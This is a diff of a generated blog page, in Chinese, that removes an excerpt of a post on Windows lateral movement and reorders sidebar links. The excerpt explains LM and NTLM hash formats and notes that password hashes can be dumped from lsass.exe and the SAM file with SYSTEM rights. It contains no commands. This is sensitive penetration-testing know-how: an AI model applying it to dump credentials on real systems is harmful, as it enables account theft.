-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:RID:LM-Hash:NTLM-Hash</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>LM Hash: 其本质为DES加密，Windows在版本Vista和2008之后就将其禁用。如在抓取之后LM-Hash值出现<code>aad3b435b51404eeaad3b435b51404ee</code>就表示LM-Hash被禁用</p>
-</li>
-<li><p>NTLM Hash: 其本质基于MD4加密算法进行加密个人版Vista和服务器版2003之后，Windows操作系统的认证方式采用NTLM Hash</p>
-</li>
-</ul>
-<h3 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h3><ul>
-<li>在Windows操作系统中抓取散列值或者明文密码，其权限必须为System，其本地用户的密码及其散列值都保存在SAM文件中。lsass.exe进程用于实现Windows的安全策略（本地安全策略和登录策略）。如此看来我们就可以使用工具在进程lsass.exe文件和SAM文件中导出密码和散列值。</li>
-</ul>
-<h4 id="读取SAM文件"><a href="#读取SAM文件" class="headerlink" title="读取SAM文件"></a>读取SAM文件</h4>
-	
-	</div>
-  <a type="button" href="/2021/04/16/内网横向（一）/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
 
 		</div>
 
@@ -526,11 +526,11 @@
 		
 			<li><a href="/tags/内网穿透/">内网穿透<span>1</span></a></li>
 		
-			<li><a href="/tags/域内横向/">域内横向<span>1</span></a></li>
+			<li><a href="/tags/MSF与CS/">MSF与CS<span>1</span></a></li>
 		
 			<li><a href="/tags/Windows内网提权/">Windows内网提权<span>1</span></a></li>
 		
-			<li><a href="/tags/MSF与CS/">MSF与CS<span>1</span></a></li>
+			<li><a href="/tags/域内横向/">域内横向<span>1</span></a></li>
 		
 		 
 		</ul>
@@ -544,6 +544,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2021/04/18/内网横向（一）/" ><i class="fa fa-file-o"></i>域内横向（一）</a>
+      </li>
+    
+      <li>
         <a href="/2021/04/16/内网提权方法/" ><i class="fa fa-file-o"></i>Windows内网提权</a>
       </li>
     
@@ -553,10 +557,6 @@
     
       <li>
         <a href="/2021/04/16/内网穿透/" ><i class="fa fa-file-o"></i>内网穿透</a>
-      </li>
-    
-      <li>
-        <a href="/2021/04/16/内网横向（一）/" ><i class="fa fa-file-o"></i>域内横向（一）</a>
       </li>
     
   </ul>
